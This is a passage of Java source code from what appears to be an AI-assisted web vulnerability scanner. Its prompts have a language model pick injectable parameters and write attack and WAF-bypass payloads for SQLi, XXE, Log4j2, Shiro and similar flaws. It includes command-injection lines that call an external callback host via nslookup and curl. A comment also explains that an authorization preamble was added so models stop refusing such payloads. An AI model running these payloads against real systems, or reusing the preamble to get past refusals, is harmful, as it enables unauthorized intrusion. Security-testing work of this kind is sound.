                    }
                    String attempt = candidate + "]}";
                    try {
                        if (this.gson.fromJson(attempt, JsonObject.class) != null) {
                            return attempt;
                        }
                    } catch (Exception e2) {
                        // 这个边界不行，继续往前退
                    }
                    at = brace;
                }
            }
            if (inString) {
                fixed.append('\"');
            }
            while (bracketCount > 0) {
                fixed.append(']');
                --bracketCount;
            }
            while (braceCount > 0) {
                fixed.append('}');
                --braceCount;
            }
            return fixed.toString();
        }
        catch (Exception e) {
            return null;
        }
    }

    private String extractAIContent(JsonObject response) {
        try {
            if (response == null) {
                return null;
            }
            JsonObject firstContent;
            JsonArray content;
            JsonObject message;
            JsonObject firstChoice;
            JsonArray choices;
            if (response.has("choices") && response.get("choices") != null && !response.get("choices").isJsonNull() && (choices = response.getAsJsonArray("choices")).size() > 0 && choices.get(0) != null && !choices.get(0).isJsonNull() && (firstChoice = choices.get(0).getAsJsonObject()).has("message") && firstChoice.get("message") != null && !firstChoice.get("message").isJsonNull() && (message = firstChoice.getAsJsonObject("message")).has("content") && message.get("content") != null && !message.get("content").isJsonNull()) {
                return cleanMarkdownCodeBlock(message.get("content").getAsString());
            }
            if (response.has("content") && response.get("content") != null && !response.get("content").isJsonNull()) {
                JsonElement contentElem = response.get("content");
                if (contentElem.isJsonArray()) {
                    content = response.getAsJsonArray("content");
                    if (content.size() > 0 && content.get(0) != null && !content.get(0).isJsonNull() && (firstContent = content.get(0).getAsJsonObject()).has("text") && firstContent.get("text") != null && !firstContent.get("text").isJsonNull()) {
                        return cleanMarkdownCodeBlock(firstContent.get("text").getAsString());
                    }
                } else if (contentElem.isJsonPrimitive()) {
                    return cleanMarkdownCodeBlock(contentElem.getAsString());
                }
            }
            if (response.has("output") && response.get("output") != null && !response.get("output").isJsonNull()) {
                return cleanMarkdownCodeBlock(response.get("output").getAsString());
            }
            if (response.has("result") && response.get("result") != null && !response.get("result").isJsonNull()) {
                return cleanMarkdownCodeBlock(response.get("result").getAsString());
            }
            if (response.has("text") && response.get("text") != null && !response.get("text").isJsonNull()) {
                return cleanMarkdownCodeBlock(response.get("text").getAsString());
            }
            if (response.has("texts") && response.get("texts") != null && !response.get("texts").isJsonNull()) {
                JsonElement textsElem = response.get("texts");
                if (textsElem.isJsonArray()) {
                    JsonArray texts = textsElem.getAsJsonArray();
                    if (texts.size() > 0 && texts.get(0) != null) {
                        return cleanMarkdownCodeBlock(texts.get(0).getAsString());
                    }
                }
            }
        }
        catch (Exception e) {
        }
        return null;
    }

    private String cleanMarkdownCodeBlock(String content) {
        if (content == null || content.trim().isEmpty()) {
            return content;
        }
        String cleaned = content.trim();
        if (cleaned.startsWith("```json")) {
            cleaned = cleaned.substring(7);
        } else if (cleaned.startsWith("```")) {
            cleaned = cleaned.substring(3);
        }
        if (cleaned.endsWith("```")) {
            cleaned = cleaned.substring(0, cleaned.length() - 3);
        }
        return cleaned.trim();
    }

    private JsonObject step2AnalyzeParamVulnMapping(ScanTask task, String requestInfo, List<String> validParamNames,
                                                    byte[] requestBytes) {
        try {
            String systemPrompt = this.buildStep2SystemPrompt(task);
            String userPrompt = this.buildStep2UserPrompt(task, requestInfo, validParamNames);
            
            JsonObject requestBody = this.buildAIRequest(systemPrompt, userPrompt);
            if (requestBody == null) {
                this.logPanel.logError(Msg.t("log.step2.buildBodyFailed"));
                return null;
            }
            
            String responseBody = this.callAI(requestBody);
            if (responseBody == null) {
                this.logPanel.logError(Msg.t("log.step2.emptyResponse"));
                return null;
            }
            
            JsonObject result = this.gson.fromJson(responseBody, JsonObject.class);
            String content = this.extractAIContent(result);
            
            if (content == null) {
                this.logPanel.logError(Msg.t("log.step2.parseContentFailed"));
                return null;
            }
            
            JsonObject step2Result = this.normalizeStep2Response(content, validParamNames, requestBytes);
            if (step2Result == null) {
                this.logPanel.logError(Msg.t("log.step2.badJson"));
                return null;
            }
            
            return step2Result;
            
        } catch (Exception e) {
            this.logPanel.logError(Msg.t("log.step2.exception"), e);
            return null;
        }
    }
    
    private PayloadResult step3GeneratePayloads(ScanTask task, String requestInfo, JsonObject step2Result,
                                                List<String> validParamNames, byte[] requestBytes) {
        try {
            String systemPrompt = this.buildStep3SystemPrompt(task, task != null ? task.getMappedVulnTypes() : null);
            String userPrompt = this.buildStep3UserPrompt(task, requestInfo, step2Result, validParamNames);
            
            JsonObject requestBody = this.buildAIRequest(systemPrompt, userPrompt);
            if (requestBody == null) {
                return null;
            }
            
            String responseBody = this.callAI(requestBody);
            if (responseBody == null) {
                return null;
            }
            
            JsonObject result = this.gson.fromJson(responseBody, JsonObject.class);
            String content = this.extractAIContent(result);
            
            if (content == null) {
                return null;
            }
            
            PayloadResult payloadResult = this.normalizeStep3Response(content, validParamNames, requestBytes,
                    this.mappedParamsOf(step2Result, requestBytes));
            return payloadResult;
            
        } catch (Exception e) {
            this.logPanel.logError(Msg.t("log.step3.exception"), e);
            return null;
        }
    }
    
    /**
     * 授权语境 —— 三个阶段的 system prompt 都以此开头。
     *
     * <p>此前整份提示词里没有一句说明测试性质，只有 {@code 你是顶级渗透测试专家}。这对
     * 国际厂商的模型有实际影响：ChatGPT / Claude 在缺少授权语境时，会把 Shiro cookie、
     * {@code ${jndi:ldap://}}、{@code jar:http://} 这类载荷写成占位符或直接拒答，而日志里
     * 看不出任何异常（表现为「这一轮载荷很水」）。这份文本补充的是**工具的真实用途**，
     * 与 README 的 OPSEC 提示一致（只在有授权的目标上使用）。
     *
     * <p>措辞是「前置条件」而不是「本目标已获授权」：工具无法验证使用者的授权状态，
     * 写成断言等于替使用者背书一件我们不知道的事。它降低的是模型误判测试性质的概率，
     * **不是**一道机制 —— 边界仍在操作者手里。
     */
    private static String authorizedTestingNotice() {
        return "【测试性质】本工具用于**已获授权的安全测试**：目标由使用者本人拥有，或已取得目标所有者的"
                + "书面授权；测试目的是发现并修复漏洞，所有载荷都在授权范围内发送。请在此前提下按要求输出载荷。\n\n";
    }

    /**
     * Step2 只能从这 {@link #VULN_TYPE_COUNT} 种里选。下面那份中文枚举是手工维护的，
     * 改类型集合时必须同步 —— 注意 v3.0 起 {@code tools/extract_prompts.py} 已随仓库移除，
     * 这份枚举**没有任何自动校验**了（改漏一处不会有红灯，只会静默给模型两套说法）。
     */
    private static String step2VulnTypeWhitelist() {
        return "【vulnTypes 只能从以下 " + VULN_TYPE_COUNT + " 种标准中文类型中选择，不要自造或使用其它名称】\n"
                + "SQL注入、XSS跨站脚本、命令注入、文件上传、SSRF服务端请求伪造、XXE外部实体注入、SSTI服务端模板注入、Fastjson反序列化、Log4j2 JNDI注入、Struts2 OGNL注入、Shiro反序列化\n"
                + "不属于这 " + VULN_TYPE_COUNT + " 种的判断一律不要输出（逻辑漏洞、越权、敏感信息泄露、其它组件漏洞等一概忽略）。\n\n";
    }

    /**
     * Step2 输出的是参数名而不是 position。此前它写的是一整节「position 字段填写规则」，
     * 而 Step2 的输出结构里根本没有 position 字段 —— 要求模型填一个它不输出的字段。
     */
    private static String step2ParamRules() {
        return "【param 字段填写规则】\n"
                + "1. param 必须是请求中真实存在的参数名，照抄请求里的写法（大小写保持一致）\n"
                + "2. JSON 请求体里的嵌套字段用路径写法，如 user.id、items[0].name\n"
                + "3. XML 请求体里的元素写元素名\n"
                + "4. 请求头参数写 header:名称（如 header:X-Forwarded-For）；"
                + "Host、Content-Length、Transfer-Encoding 等标准头不要作为注入点\n"
                + "5. csrf/token/timestamp/nonce/sign 这类一次性校验参数不要输出（不是有效注入点）\n"
                + "6. URL 路径里的可变段（REST 风格，如 /api/user/123、/order/1001/detail）写 URL_PATH"
                + "（指最后一段）或 URL_PATH[下标]（下标从 0 起，指第几段）；路径里没有可变段就不要写这一条\n"
                + "7. param 无效的映射会被整条丢弃，所以只输出确实存在于请求中的参数\n\n";
    }

    /**
     * 注入点提示 —— 专门给「注入点不在请求已有的参数里」的类型补上下文。
     *
     * <p>为什么需要：Step2 是唯一一道闸门，paramVulnMap 为空就一个包都不发、任务以「安全」结束。
     * 而 Shiro（rememberMe cookie 可能压根不在请求里）、Log4j2（打的是会被写进日志的 User-Agent
     * 这类头）、Fastjson / XXE（打的是整个请求体）的注入点都不是普通参数，
     * 只给一句「只输出确实存在于请求中的参数」的话模型很容易一个都点不出来 —— 于是漏报，
     * 而日志里只看得到「AI 未发现值得测试的参数，本次不发包」。
     *
     * <p>列出的写法都被 {@code isValidPosition} 认可（header:名称 / 白名单头 / cookie 参数名 /
     * header:Cookie / BODY / URL_PATH），所以这里不是让模型编位置，而是把「合法位置有哪些」说清楚。
     *
     * <p>**按扫描模式裁剪**（2026-09-23 之前是无条件全发）：单类型扫描收到别的类型的注入点暗示时，
     * 模型会给本来没有注入点的位置编一个出来。最具体的后果是文件上传档：命中第 3 条「写 BODY」后
     * {@code replaceWholeBody} 会把整个 multipart 请求体换成一行 {@code filename="shell.php"}，
     * 那是个结构破碎的请求，载荷确实在字节里、注入层的自检也过得去，但目标根本解析不出文件。
     */
    private static String step2InjectionHints(ScanTask.ScanMode mode) {
        return STEP2_HINT_HEADER + injectionTipsFor(mode) + "\n\n";
    }

    /**
     * 本次扫描用得上的注入点提示分片。写成 switch + 整段字面量（而不是循环拼装）是为了让每段
     * 提示词都是「一处一个完整字符串」，便于人工整段核对与复制（v3.0 之前是靠
     * {@code tools/extract_prompts.py} 抽快照自动比对，该脚本已移除）。
     */
    private static String injectionTipsFor(ScanTask.ScanMode mode) {
        if (mode == null) mode = ScanTask.ScanMode.CUSTOM;
        switch (mode) {
            case CUSTOM:
                return STEP2_TIP_HEADERS + STEP2_TIP_COOKIE + STEP2_TIP_BODY
                        + STEP2_TIP_URLPATH + STEP2_TIP_UPLOAD;
            case LOG4J2:
                return STEP2_TIP_HEADERS + STEP2_TIP_URLPATH;
            case STRUTS2:
                return STEP2_TIP_HEADERS + STEP2_TIP_BODY + STEP2_TIP_URLPATH;
            case SHIRO:
                return STEP2_TIP_COOKIE;
            case FASTJSON:
                return STEP2_TIP_BODY;
            case XXE:
                return STEP2_TIP_BODY;
            case FILE_UPLOAD:
                return STEP2_TIP_UPLOAD;
            default:
                // SQL注入 / XSS / 命令注入 / SSTI / SSRF：注入点就是普通参数或路径段
                return STEP2_TIP_URLPATH;
        }
    }

    private static final String STEP2_HINT_HEADER =
            "【注入点提示（以下写法都是合法 param，不会因为是补充出来的就被丢弃）】\n";
    private static final String STEP2_TIP_HEADERS =
            "· 请求头也是注入点：Log4j2 打 header:User-Agent、header:X-Forwarded-For、header:Referer；"
                    + "Struts2 S2-045/046 打 header:Content-Type（它同时还要带上一个普通参数）\n";
    private static final String STEP2_TIP_COOKIE =
            "· Cookie 也是注入点：Shiro 的 rememberMe 是**cookie** —— Cookie 头里真的有 rememberMe 才写 "
                    + "rememberMe，否则写 header:Cookie（两种写法都合法，不要因为请求里没有这个 cookie 就不输出）。"
                    + "注意区分同名表单字段：登录页常有一个 rememberMe=on 的**表单参数**（Remember Me 复选框），"
                    + "Shiro 不看它 —— 只有 Cookie 头里的 rememberMe 才会被反序列化，这种情况下仍然写 header:Cookie\n";
    private static final String STEP2_TIP_BODY =
            "· 整个请求体也是注入点：Fastjson（JSON 文档）、XXE 与 Struts2 S2-069（XML 文档）写 BODY\n";
    private static final String STEP2_TIP_URLPATH =
            "· URL 路径段：REST 风格路径里的可变段写 URL_PATH 或 URL_PATH[下标]\n";
    private static final String STEP2_TIP_UPLOAD =
            "· 文件上传的注入点是 multipart 的 part 名（如 file），照请求里的部件名填；同一个部件的 "
                    + "filename / name 属性与它是**同一个注入点**，paramVulnMap 里只写一条"
                    + "（请求里确实没有部件名、只有 filename 属性时才写 filename）—— 两个都写会让同一个上传面被打两遍；"
                    + "**文件上传类的组合不要用 BODY** —— 整段替换会把 multipart 结构毁掉\n";

    private String buildStep2SystemPrompt(ScanTask task) {
        ScanTask.ScanMode mode = task != null ? task.getScanMode() : ScanTask.ScanMode.CUSTOM;
        if (mode == null || mode.isCustom()) {
            return "你是顶级渗透测试专家。分析 HTTP 请求和响应，**筛选出值得发包测试的参数**，生成参数-漏洞映射（paramVulnMap）。\n\n"
                    + authorizedTestingNotice()
                    + "【核心任务】\n"
                    + "1. 逐个分析请求中的参数：它在什么位置（URL 查询 / 请求体 / Cookie / 请求头）、"
                    + "请求体是什么格式（表单 / JSON / XML / multipart）、参数值是什么形态（数字、字符串、文件名、URL、JSON 片段）\n"
                    + "2. 结合响应特征（状态码、响应头、响应体）辅助判断\n"
                    + "3. **只输出你判断「确实可能存在漏洞」的参数-漏洞组合**：下一步只给 paramVulnMap 里的组合生成并发送 PoC —— "
                    + "没列进来的参数不会被测试，列错了的参数会被白白打一遍\n"
                    + "4. 宁缺毋滥：没有把握的参数直接不输出；同一个参数最多给 3 种漏洞类型，"
                    + "每种都要在 reason 里写清依据（参数值形态、响应特征、组件指纹、报错信息），不要写「可能存在」这类空话\n"
                    + "5. 一个参数都判断不出来时返回空数组 \"paramVulnMap\": []，表示本次不需要发包\n"
                    + "6. 输出 analysis 说明与 paramVulnMap 数组\n\n"
                    + step2VulnTypeWhitelist()
                    + step2ParamRules()
                    + step2InjectionHints(mode)
                    + "【输出格式】\n"
                    + "返回纯 JSON，格式：\n"
                    + "{\n"
                    + "  \"analysis\": \"整体分析说明\",\n"
                    + "  \"paramVulnMap\": [\n"
                    + "    {\"param\": \"参数名\", \"vulnTypes\": [\"SQL注入\", \"XSS跨站脚本\"], \"reason\": \"判断原因\"}\n"
                    + "  ]\n"
                    + "}";
        }

        String vulnType = getVulnTypeFromScanMode(mode);
        return "你是顶级渗透测试专家。分析 HTTP 请求和响应，**筛选出值得发包测试的参数**，生成参数-漏洞映射（paramVulnMap）。\n\n"
                + authorizedTestingNotice()
                + "【核心任务】\n"
                + "1. 逐个分析请求中的参数：它在什么位置（URL 查询 / 请求体 / Cookie / 请求头）、"
                + "请求体是什么格式（表单 / JSON / XML / multipart）、参数值是什么形态\n"
                + "2. 结合响应特征（状态码、响应头、响应体）辅助判断\n"
                + "3. 判断**哪些参数确实可能存在 " + mode.getDisplayName() + " 漏洞**：只把有依据的参数放进 paramVulnMap，"
                + "下一步只给它们发包；没把握的参数不要输出，列错了的参数会被白白打一遍\n"
                + "4. reason 里写清依据（参数值形态、响应特征、组件指纹、报错信息），不要写「可能存在」这类空话\n"
                + "5. 一个参数都不满足时返回空数组 \"paramVulnMap\": []，表示本次不需要发包\n"
                + "6. 输出 analysis 说明与 paramVulnMap 数组\n\n"
                + "【vulnTypes 固定填写】\"" + vulnType + "\"，不要填其他类型名\n\n"
                + step2ParamRules()
                + step2InjectionHints(mode)
                + "【输出格式】\n"
                + "返回纯 JSON，格式：\n"
                + "{\n"
                + "  \"analysis\": \"整体分析说明\",\n"
                + "  \"paramVulnMap\": [\n"
                + "    {\"param\": \"参数名\", \"vulnTypes\": [\"" + vulnType + "\"], \"reason\": \"判断原因\"}\n"
                + "  ]\n"
                + "}";
    }
    
    private String buildStep2UserPrompt(ScanTask task, String requestInfo, List<String> validParamNames) {
        StringBuilder sb = new StringBuilder();
        sb.append("【待分析的HTTP请求】\n\n");
        sb.append(requestInfo);
        sb.append("\n\n【已识别的有效参数】\n");
        if (validParamNames != null && !validParamNames.isEmpty()) {
            for (String param : validParamNames) {
                sb.append("- ").append(param).append("\n");
            }
        } else {
            sb.append("(无)\n");
        }
        sb.append("\n请筛选出确实可能存在漏洞的参数（没有把握的不要输出），生成 paramVulnMap；一个都没有就返回空数组。");
        return sb.toString();
    }
    
    /**
     * Step3 的 System Prompt。
     * CUSTOM 模式只把 paramVulnMap 里出现的类型的指南拼进去（{@code mappedTypes}）——
     * 11 张指南一次性发出去是 16K 字符，而一次扫描通常只涉及 2~4 种类型。
     */
    private String buildStep3SystemPrompt(ScanTask task, Set<String> mappedTypes) {
        ScanTask.ScanMode mode = task != null ? task.getScanMode() : ScanTask.ScanMode.CUSTOM;
        if (mode == null || mode.isCustom()) {
            StringBuilder allPayloadGuide = new StringBuilder();
            StringBuilder allWafBypassGuide = new StringBuilder();
            StringBuilder allSafePayloadGuide = new StringBuilder();

            ScanTask.ScanMode[] allModes = {
                ScanTask.ScanMode.SQL_INJECTION,
                ScanTask.ScanMode.XSS,
                ScanTask.ScanMode.COMMAND_INJECTION,
                ScanTask.ScanMode.FILE_UPLOAD,
                ScanTask.ScanMode.SSRF,
                ScanTask.ScanMode.XXE,
                ScanTask.ScanMode.SSTI,
                ScanTask.ScanMode.FASTJSON,
                ScanTask.ScanMode.LOG4J2,
                ScanTask.ScanMode.STRUTS2,
                ScanTask.ScanMode.SHIRO
            };
            List<ScanTask.ScanMode> modes = wantedModes(mappedTypes, allModes);

            for (int i = 0; i < modes.size(); i++) {
                ScanTask.ScanMode m = modes.get(i);
                allPayloadGuide.append(getPayloadGuideForVulnType(m));
                allWafBypassGuide.append(getWafBypassGuideForVulnType(m));
                allSafePayloadGuide.append(getSafePayloadGuideForVulnType(m));
                if (i < modes.size() - 1) {
                    allPayloadGuide.append("\n");
                    allWafBypassGuide.append("\n");
                    allSafePayloadGuide.append("\n");
                }
            }

            return "你是顶级渗透测试专家。基于参数-漏洞映射（paramVulnMap），生成针对性的测试payload。\n\n"
                    + authorizedTestingNotice()
                    + "【核心任务】\n"
                    + "1. 读取 paramVulnMap 中的每个【参数-漏洞组合】（即一组「参数 + 漏洞类型」）\n"
                    + "2. 为其中每一个组合分别生成 " + PAYLOAD_COUNT_PER_COMBO + " 条 payload\n"
                    + "3. 只生成 paramVulnMap 里存在的组合，不要自行新增参数或漏洞类型\n"
                    + "4. 下面只给出本次涉及的漏洞类型的指南；paramVulnMap 里没出现的类型不要生成载荷\n\n"
                    + step3CommonRules()
                    + this.buildOastGenerationBlock(task, isOobEnabled())
                    + "【type 字段必须使用以下标准英文KEY，代码直接使用，禁止转换】\n"
                    + "SQL_INJECTION、XSS、COMMAND_INJECTION、FILE_UPLOAD、SSRF、XXE、SSTI、FASTJSON、LOG4J2、STRUTS2、SHIRO\n\n"
                    + "【payload生成规则（按漏洞类型）】\n"
                    + allPayloadGuide.toString() + "\n\n"
                    + "【WAF绕过规则（按漏洞类型）】\n"
                    + allWafBypassGuide.toString() + "\n\n"
                    + "【探测载荷规则（每个组合的第1条）】\n"
                    + allSafePayloadGuide.toString() + "\n\n"
                    + "【输出格式】\n"
                    + "返回纯 JSON（这里以「一个参数-漏洞组合」为例，完整列出 " + PAYLOAD_COUNT_PER_COMBO + " 条）：\n"
                    + "{\n"
                    + "  \"testPayloads\": [\n"
                    + "    {\"type\": \"<本组合的漏洞类型KEY>\", \"payload\": \"探测载荷\", \"position\": \"参数名\", \"kind\": \"probe\", \"wafBypass\": false},\n"
                    + "    {\"type\": \"<本组合的漏洞类型KEY>\", \"payload\": \"主攻载荷1\", \"position\": \"参数名\", \"kind\": \"attack\", \"wafBypass\": false},\n"
                    + "    {\"type\": \"<本组合的漏洞类型KEY>\", \"payload\": \"主攻载荷2\", \"position\": \"参数名\", \"kind\": \"attack\", \"wafBypass\": false},\n"
                    + "    {\"type\": \"<本组合的漏洞类型KEY>\", \"payload\": \"主攻载荷3\", \"position\": \"参数名\", \"kind\": \"attack\", \"wafBypass\": false},\n"
                    + "    {\"type\": \"<本组合的漏洞类型KEY>\", \"payload\": \"主攻载荷4\", \"position\": \"参数名\", \"kind\": \"attack\", \"wafBypass\": false},\n"
                    + "    {\"type\": \"<本组合的漏洞类型KEY>\", \"payload\": \"WAF绕过载荷1\", \"position\": \"参数名\", \"kind\": \"bypass\", \"wafBypass\": true},\n"
                    + "    {\"type\": \"<本组合的漏洞类型KEY>\", \"payload\": \"WAF绕过载荷2\", \"position\": \"参数名\", \"kind\": \"bypass\", \"wafBypass\": true},\n"
                    + "    {\"type\": \"<本组合的漏洞类型KEY>\", \"payload\": \"WAF绕过载荷3\", \"position\": \"参数名\", \"kind\": \"bypass\", \"wafBypass\": true},\n"
                    + "    {\"type\": \"<本组合的漏洞类型KEY>\", \"payload\": \"WAF绕过载荷4\", \"position\": \"参数名\", \"kind\": \"bypass\", \"wafBypass\": true}\n"
                    + "  ]\n"
                    + "}\n"
                    + "（KEY 必须是上面列出的标准英文KEY里、属于本组合的那一个，载荷内容按对应类型的指南来写；"
                    + "每个组合都重复这 " + PAYLOAD_COUNT_PER_COMBO + " 条的槽位结构）\n";
        }

        // typeKey 与常量名一一对应，无需再维护一张平行映射表（CUSTOM 已在上方分支排除）
        String vulnTypeKey = mode.getTypeKey();
        String payloadGuide = getPayloadGuideForVulnType(mode);
        String wafBypassGuide = getWafBypassGuideForVulnType(mode);
        String safePayloadGuide = getSafePayloadGuideForVulnType(mode);

        return "你是顶级渗透测试专家。基于参数-漏洞映射，生成 " + mode.getDisplayName() + " 的测试payload。\n\n"
                + authorizedTestingNotice()
                + "【核心任务】\n"
                + "1. 读取 paramVulnMap 中的每个【参数-漏洞组合】（即一组「参数 + 漏洞类型」）\n"
                + "2. 为其中每一个组合分别生成 " + PAYLOAD_COUNT_PER_COMBO + " 条 payload，"
                + "本次扫描的漏洞类型固定为 " + mode.getDisplayName() + "\n\n"
                + step3CommonRules()
                + this.buildOastGenerationBlock(task, isOobEnabled())
                + "【type 字段必须使用标准英文KEY：】" + vulnTypeKey + "\n\n"
                + "【payload生成规则】\n"
                + payloadGuide + "\n\n"
                + "【WAF绕过规则】\n"
                + wafBypassGuide + "\n\n"
                + "【探测载荷规则（每个组合的第1条）】\n"
                + safePayloadGuide + "\n\n"
                + "【输出格式】\n"
                + "返回纯 JSON（这里以「一个参数-漏洞组合」为例，完整列出 " + PAYLOAD_COUNT_PER_COMBO + " 条）：\n"
                + "{\n"
                + "  \"testPayloads\": [\n"
                + "    {\"type\": \"" + vulnTypeKey + "\", \"payload\": \"探测载荷\", \"position\": \"参数名\", \"kind\": \"probe\", \"wafBypass\": false},\n"
                + "    {\"type\": \"" + vulnTypeKey + "\", \"payload\": \"主攻载荷1\", \"position\": \"参数名\", \"kind\": \"attack\", \"wafBypass\": false},\n"
                + "    {\"type\": \"" + vulnTypeKey + "\", \"payload\": \"主攻载荷2\", \"position\": \"参数名\", \"kind\": \"attack\", \"wafBypass\": false},\n"
                + "    {\"type\": \"" + vulnTypeKey + "\", \"payload\": \"主攻载荷3\", \"position\": \"参数名\", \"kind\": \"attack\", \"wafBypass\": false},\n"
                + "    {\"type\": \"" + vulnTypeKey + "\", \"payload\": \"主攻载荷4\", \"position\": \"参数名\", \"kind\": \"attack\", \"wafBypass\": false},\n"
                + "    {\"type\": \"" + vulnTypeKey + "\", \"payload\": \"WAF绕过载荷1\", \"position\": \"参数名\", \"kind\": \"bypass\", \"wafBypass\": true},\n"
                + "    {\"type\": \"" + vulnTypeKey + "\", \"payload\": \"WAF绕过载荷2\", \"position\": \"参数名\", \"kind\": \"bypass\", \"wafBypass\": true},\n"
                + "    {\"type\": \"" + vulnTypeKey + "\", \"payload\": \"WAF绕过载荷3\", \"position\": \"参数名\", \"kind\": \"bypass\", \"wafBypass\": true},\n"
                + "    {\"type\": \"" + vulnTypeKey + "\", \"payload\": \"WAF绕过载荷4\", \"position\": \"参数名\", \"kind\": \"bypass\", \"wafBypass\": true}\n"
                + "  ]\n"
                + "}\n"
                + "（下一个组合重复这 " + PAYLOAD_COUNT_PER_COMBO + " 条的结构）\n";
    }

    /** 外带回连检测是否启用（配置里的开关；配置读不到时按**启用**处理） */
    private static boolean isOobEnabled() {
        ConfigManager.Config config = ConfigManager.getInstance().getConfig();
        return config == null || config.isOobEnabled();
    }

    /**
     * 这条载荷是不是「外带类」从而必须被跳过（仅在外带回连关闭时）。
     *
     * <p>判据与发送前改写载荷的判据同源：带 Shiro 生成标记，或载荷里出现回连域名/占位符
     * （{@code oob.invalid}，含编码写法）。只按「有没有拿到域名」判断是不够的 ——
     * 关闭时我们根本不申请域名，而占位符仍然在载荷里，靠 {@code OASTClient.isOobPayload(payload, null)}
     * 才认得出来。
     */
    private static boolean shouldSkipOobPayload(String payload, boolean oobEnabled, String oastHost) {
        if (oobEnabled) return false;
        return ShiroPayload.hasMarker(payload) || OASTClient.isOobPayload(payload, oastHost);
    }

    /**
     * 生成载荷阶段的外带域名块。三种形态必须分清，否则模型会去猜一个它拿不到的东西：
     * 关闭 → 明确禁止生成外带载荷；开着但没拿到域名 → 同样禁止；拿到域名 → 给出写法与两个坑。
     */
    private String buildOastGenerationBlock(ScanTask task, boolean oobEnabled) {
        if (!oobEnabled) {
            return "【外带回连域名】\n本次扫描已关闭外带回连检测（可在配置里开启）。不要生成依赖"
                    + "「目标向外部域名发起请求」的载荷（如 curl/wget 外带、DNS 外带、外部 DTD、JNDI 外带），"
                    + "这类载荷没有回连记录就无法验证，发了只会白打一条。\n\n";
        }
        String host = task != null ? task.getOastHost() : null;
        if (host == null || host.isEmpty()) {
            return "【外带回连域名】\n本次未取得回连域名（回连服务不可用）。不要生成依赖「目标向外部域名发起请求」的载荷"
                    + "（如 curl/wget 外带、DNS 外带、外部 DTD），这类载荷没有回连服务就无法验证。\n\n";
        }
        return "【外带回连域名】\n" + host + "\n"
                + "外带载荷只需要让目标把这个域名解析一次：判据就是「目标查询了这个专属域名」，"
                + "不需要把任何命令输出带回来，所以**不要**拼接 whoami/hostname 之类的命令替换"
                + "（输出里的空格、反斜杠等字符会让命令直接报错，反而证明不了执行）。\n"
                + "每条载荷发出前，程序会自动在域名最左侧加一个本次请求专用的随机前缀，"
                + "所以照原样写这个域名即可（指南里的 http://oob.invalid 也可以直接保留，程序会自动换成该域名）：\n"
                + "  Linux 命令注入 · DNS 外带：;nslookup " + host + "（优先）或 ;ping -c 1 -W 2 " + host + "\n"
                + "  Windows 命令注入 · DNS 外带：|nslookup " + host + "（优先）或 |ping -n 1 -w 2000 " + host + "\n"
                + "  HTTP 外带（目标能出 TCP 时）：Linux ;curl http://" + host + "/x ／ Windows cmd 用 & curl http://" + host + "/x（cmd 的分隔符是 & 不是 ;）\n"
                + "  XXE 外部 DTD：http://" + host + "/evil.dtd    SSRF 出网验证：http://" + host + "/\n"
                + "两个必须避开的坑：\n"
                + "  1. ping 的参数两个平台不通用：限制次数在 Linux 是 -c、在 Windows 是 -n，"
                + "写错只会在目标上回一句报错、根本不会发起解析；nslookup 两个平台都有、发完查询就返回，所以优先用它。\n"
                + "  2. 别让命令挂住：ping 会等回包，目标丢 ICMP 时要一直等到超时（十几秒），"
                + "会把响应拖过测试超时时间，所以必须带超时参数（Linux -W 秒，Windows -w 毫秒）。\n"
                + "DNS 外带最通用：目标出网被限制时 TCP 常被拦，DNS 往往还能出去。\n"
                + "不需要外带的载荷保持原样，不要为了用它而改变载荷本身。\n\n";
    }

    /**
     * Step3 两个分支共用的规则块（此前这些规则在两个分支里各写一遍、
     * 且「12 个 payload / 6+6 / 50%」在同一段提示词里重复了 5 次）。
     */
    private static String step3CommonRules() {
        return "【每个参数-漏洞组合的 payload 结构（必须严格遵守）】\n"
                + "每个组合恰好 " + PAYLOAD_COUNT_PER_COMBO + " 条，按顺序：\n"
                + "  第1条 探测载荷 kind=\"probe\" wafBypass=false —— 本身不追求触发漏洞。"
                + "**插件会把这一条的响应，作为同一组合其余载荷的对照一并交给验证模型**"
                + "（布尔盲注那类漏洞要「恒真」与「恒假」两条摆在一起才判得了），所以这一条要挑真正温和的载荷："
                + "字符形态与该类型的攻击载荷接近，但不要报错、不要触发 WAF、不要改变业务语义 —— "
                + "它要能当「正常业务响应」的参照\n"
                + "  第2-5条 主攻载荷 kind=\"attack\" wafBypass=false —— 直接验证漏洞是否成立\n"
                + "  第6-9条 WAF绕过载荷 kind=\"bypass\" wafBypass=true —— 用编码、混淆、大小写混合尝试绕过防护\n"
                + "kind 字段必须照上面填 probe / attack / bypass（代码靠它判断哪一条能当对照）。\n"
                + "这 9 条必须手法不同。只改数字、只改引号、只加一个无关字符都算不合格输出，"
                + "宁可少写一条也不要用变体凑数。\n"
                + "  例外（Shiro）：它的手法只有「换密钥」这一种（本工具不生成 CommonsCollections/JRMP 链），"
                + "所以 Shiro 的 9 条按「换密钥 + 换 cookie 名大小写 + 换 Base64 变形 + 换注入位置」区分即可，不要求换 gadget。\n\n"
                + "【position 字段只能填以下四种之一】\n"
                + "1. 请求中真实存在的参数名（照抄请求里的写法；嵌套 JSON 字段可用 user.id、items[0].name）\n"
                + "2. header:名称 —— 注入 HTTP 请求头，如 header:X-Forwarded-For、header:Referer。"
                + "仅限 Cookie 与自定义头（X- 开头、Origin、Referer、Authorization 等），"
                + "Host/Content-Length/Transfer-Encoding 等标准头会被拒绝\n"
                + "3. BODY —— 整段替换请求体。仅用于完整 XML 文档（XXE）、GraphQL 查询、纯文本 body\n"
                + "4. URL_PATH 或 URL_PATH[下标] —— URL 路径里的某一段（REST 风格，如 /api/user/123 里的 123）。"
                + "URL_PATH 指最后一段，URL_PATH[0] 是第一段。只有 paramVulnMap 里点名过 URL_PATH、"
                + "且路径里确实有可变段时才用；载荷里的空格会被自动编码成 %20，"
                + "/ 与 . 保持原样（路径穿越载荷靠它们）\n"
                + "禁止：空、null、auto、URL，以及请求里根本不存在的参数名。"
                + "位置写错会让这条载荷被直接丢弃、白白浪费一次测试。\n\n"
                + "【payload 字段的两种形态】\n"
                + "1. 参数值形态（默认）：payload 只是参数的值，不含参数名。例如 1' OR '1'='1\n"
                + "2. 整段替换形态：仅当 position 为 BODY 时，payload 是完整的请求体内容\n\n"
                + "【编码】不要把载荷整体做 URL 编码或 HTML 转义 —— 那会把它变成没有攻击含义的字面量。\n"
                + "程序会对「参数值」位置（URL 查询参数、表单 body 参数）做**必要的**百分号编码，你按字面写就行：\n"
                + "1. & # + 必编 —— 不编的话服务端会把它们当成结构：& 拆出新参数、# 当片段、+ 按表单规则解成空格；\n"
